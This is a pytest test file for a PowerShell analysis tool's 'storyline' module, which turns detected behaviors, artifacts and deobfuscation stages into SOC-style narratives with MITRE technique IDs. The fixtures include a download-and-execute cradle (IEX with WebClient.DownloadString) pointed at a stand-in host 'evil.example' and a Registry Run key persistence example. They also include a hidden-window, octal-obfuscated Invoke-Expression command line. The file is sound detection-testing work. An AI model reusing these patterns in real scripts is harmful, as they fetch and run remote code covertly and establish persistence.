"""Storyline module regression — deterministic, evidence-driven narrative.

Locked with SOC user 2026-07-27. Every case must:
    • Emit `executive_summary` and `attack_narrative`.
    • Emit exactly one section per SECTION_MAP entry PLUS deobfuscation_chain
      and final_decoded_script.
    • Report `observed=False` with an explicit "No … observed." narrative
      when no evidence supports that section.
    • Attach MITRE technique IDs only to sections whose behaviors carry them.
"""
from __future__ import annotations

import pytest

from v2.semantic.ps_storyline import build_storyline, SECTION_MAP
from v2.semantic.ps_semantic import analyze as analyze_powershell


EXPECTED_SECTIONS = [
    "deobfuscation_chain",
    "final_decoded_script",
] + [k for (k, _t, _ids) in SECTION_MAP]


# ── Direct storyline builder tests ────────────────────────────────
def test_empty_input_returns_all_sections_marked_not_observed():
    st = build_storyline(recovered_script="",
                          behaviors_v2=[],
                          artifacts=[],
                          deobfuscation={},
                          verdict_breakdown={"verdict": "inconclusive"})
    got = [s["key"] for s in st["sections"]]
    assert got == EXPECTED_SECTIONS, f"unexpected sections order: {got}"
    for sec in st["sections"]:
        if sec["key"] == "final_decoded_script":
            # observed=False because there's no script
            assert not sec["observed"]
        elif sec["key"] == "deobfuscation_chain":
            assert not sec["observed"]
        else:
            assert not sec["observed"], \
                f"section {sec['key']} should be marked NOT observed on empty input"
            assert "No " in sec["narrative"] or "no " in sec["narrative"]
    assert "INCONCLUSIVE" in st["executive_summary"]
    assert "No offensive behavior" in st["attack_narrative"]


def test_network_download_produces_network_section_only():
    behaviors = [
        {"id": "invoke_expression", "name": "PowerShell Invoke-Expression",
         "severity": "high", "confidence": 95, "mitre": ["T1059.001"]},
        {"id": "webclient_downloadstring", "name": "WebClient DownloadString",
         "severity": "high", "confidence": 92, "mitre": ["T1105", "T1059.001"]},
    ]
    artifacts = [
        {"kind": "url", "value": "https://evil.example/x.ps1",
         "classification": "external"},
    ]
    st = build_storyline(
        recovered_script="IEX (New-Object Net.WebClient).DownloadString('https://evil.example/x.ps1')",
        behaviors_v2=behaviors, artifacts=artifacts,
        deobfuscation={}, verdict_breakdown={"verdict": "malicious",
                                              "risk_score": 88})
    sec = {s["key"]: s for s in st["sections"]}
    assert sec["initial_execution"]["observed"]
    assert sec["network_behavior"]["observed"]
    assert "evil.example" in sec["network_behavior"]["narrative"]
    # Non-network sections must remain NOT observed
    for k in ("file_activity", "registry_activity", "persistence",
              "credential_access"):
        assert not sec[k]["observed"], f"{k} must be NOT observed"
    # MITRE roll-up captures both techniques
    mids = {m["id"] for m in st["mitre_techniques"]}
    assert {"T1059.001", "T1105"}.issubset(mids)
    assert "MALICIOUS" in st["executive_summary"]


def test_registry_run_key_populates_persistence_and_registry():
    behaviors = [
        {"id": "registry_run_key", "name": "Registry Run Key",
         "severity": "high", "confidence": 90,
         "mitre": ["T1547.001"]},
    ]
    artifacts = [
        {"kind": "registry",
         "value": r"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
         "classification": ""},
    ]
    st = build_storyline(
        recovered_script="Set-ItemProperty -Path HKCU:\\Software\\... -Name x -Value y",
        behaviors_v2=behaviors, artifacts=artifacts,
        deobfuscation={}, verdict_breakdown={"verdict": "suspicious"})
    sec = {s["key"]: s for s in st["sections"]}
    assert sec["persistence"]["observed"]
    assert sec["registry_activity"]["observed"]
    # Persistence section carries the T1547.001 MITRE
    assert "T1547.001" in sec["persistence"]["mitre"]


def test_deobfuscation_chain_summary_reflects_stage_count_and_boundary():
    deob = {
        "original": "junk",
        "final":    "Write-Host 'hi'",
        "stopped_reason": ("execution boundary — `Invoke-Expression` present; "
                            "further evaluation would require running PowerShell."),
        "boundary_op": "Invoke-Expression",
        "stages": [
            {"n": 1, "technique": "Octal ASCII reconstruction",
             "evidence": "Recovered 15 chars", "before": "123,45", "after": "hi"},
            {"n": 2, "technique": "Concat resolver",
             "evidence": "'a'+'b'", "before": "'a'+'b'", "after": "'ab'"},
        ],
    }
    st = build_storyline(
        recovered_script="Write-Host 'hi'",
        behaviors_v2=[], artifacts=[],
        deobfuscation=deob, verdict_breakdown={"verdict": "inconclusive"})
    dchain = next(s for s in st["sections"] if s["key"] == "deobfuscation_chain")
    assert dchain["observed"] is True
    assert "2 deterministic transformation" in dchain["narrative"]
    assert "Octal ASCII reconstruction" in dchain["narrative"]
    assert "Invoke-Expression" in dchain["narrative"]


# ── End-to-end via analyze_powershell ─────────────────────────────
def test_octal_char_reconstruction_produces_storyline_with_final_payload():
    target = "Write-Host 'Hello, from PowerShell!'"
    octal_list = ",".join(oct(ord(c))[2:] for c in target)
    cmdline = (
        f"powershell.exe -NoP -W Hidden -C "
        f"\"$s=[String]::Join([char]0,[char[]](({octal_list}) "
        f"| %{{ [char][Convert]::ToInt16($_,8) }}));Invoke-Expression $s\""
    )
    result = analyze_powershell(cmdline)
    d = result.to_dict()
    assert d["storyline"], "storyline must be attached to semantic result"
    exec_summary = d["storyline"]["executive_summary"]
    assert exec_summary, "executive_summary must be populated"

    # The recursive deobfuscator must have unwrapped the octal list to the
    # final Write-Host payload before storyline was generated.
    final_scr = d["storyline"]["sections"][1]["narrative"]
    assert "Write-Host" in final_scr, \
        f"final decoded script must contain the recovered payload, got: {final_scr!r}"

    dchain = d["storyline"]["sections"][0]
    assert dchain["observed"] is True
    assert "Octal" in dchain["narrative"] or "octal" in dchain["narrative"] \
        or "Char" in dchain["narrative"], dchain["narrative"]
